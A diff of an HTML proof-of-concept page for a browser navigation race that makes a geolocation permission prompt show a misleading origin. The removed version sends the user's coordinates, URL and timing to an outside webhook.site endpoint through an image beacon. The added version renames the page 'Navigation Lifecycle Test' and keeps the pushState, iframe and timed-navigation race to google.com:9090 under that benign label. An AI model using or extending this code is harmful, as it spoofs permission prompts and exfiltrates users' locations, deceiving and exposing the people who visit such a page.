@@ -2,133 +2,96 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Geolocation Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Navigation Lifecycle Test</title>
 
 <style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
+body{
+font-family:Arial;
+text-align:center;
+margin-top:120px;
 }
-button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
+
+button{
+padding:16px 32px;
+font-size:18px;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>Request Location</h2>
-  <p>Tap the button below to request Geolocation permission.</p>
-
-  <button onclick="getLocation()">Get Location</button>
-  <p id="output">Location: -</p>
-
-  <div class="notice">
-    Demo only — observe origin shown in permission dialog
-  </div>
-</div>
+<h2>Navigation Lifecycle Test</h2>
+<button id="start">Start</button>
 
 <script>
-const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
 
-/* 🔥 CORS-proof forensic logger */
-function logEvent(type, extra = {}) {
-  const data = {
-    type,
-    ts: performance.now().toFixed(3),
-    epoch: Date.now(),
-    url: location.href,
-    origin: location.origin,
-    visibility: document.visibilityState,
-    readyState: document.readyState,
-    ...extra
-  };
+const startBtn = document.getElementById("start");
 
-  const params = new URLSearchParams(data).toString();
+startBtn.onclick = function(){
 
-  // Image beacon → tidak kena CORS & tetap terkirim saat navigation
-  new Image().src = `${LOG_ENDPOINT}?${params}`;
-}
+/* Step 1: history state */
 
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
+history.pushState({}, '', '#state1');
+history.replaceState({}, '', '#state2');
 
-function getLocation() {
-  if (!navigator.geolocation) return;
 
-  logEvent("geolocation_requested");
+/* Step 2: create iframe */
 
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      logEvent("geolocation_success", {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude
-      });
+const iframe = document.createElement("iframe");
+iframe.style.width = "100%";
+iframe.style.height = "300px";
+iframe.src = "about:blank";
+document.body.appendChild(iframe);
 
-      output.textContent =
-        `${pos.coords.latitude}, ${pos.coords.longitude}`;
-    },
-    err => {
-      logEvent("geolocation_error", { code: err.code });
-      output.textContent = 'Permission denied';
-    }
-  );
-}
 
-/* Step 1: URL manipulation */
-trigger.onclick = () => {
-  logEvent("poc_started");
+/* Step 3: delayed content */
 
-  history.pushState({}, '', '/trusted');
-  logEvent("pushstate_done", { newPath: location.pathname });
+setTimeout(function(){
 
-  panel.style.display = 'block';
+try{
+
+iframe.contentDocument.open();
+iframe.contentDocument.write(`
+<html>
+<body style="font-family:Arial;text-align:center;margin-top:60px;">
+<h3>Lifecycle Frame</h3>
+<p>Testing navigation timing.</p>
+</body>
+</html>
+`);
+iframe.contentDocument.close();
+
+}catch(e){}
+
+},800);
+
+
+/* Step 4: navigation timing */
+
+requestAnimationFrame(function(){
+
+requestAnimationFrame(function(){
+
+setTimeout(function(){
+
+location.href = "http://google.com:9090";
+
+},120);
+
+});
+
+});
+
 };
 
-/* Step 2: Navigation race */
-window.addEventListener('pageshow', () => {
-  logEvent("pageshow");
+window.addEventListener("pageshow",function(e){
 
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        logEvent("navigation_triggered", {
-          target: "https://google.com:9090"
-        });
+if(e.persisted){
+history.replaceState({}, '', '#restored');
+}
 
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
 });
+
 </script>
 
 </body>
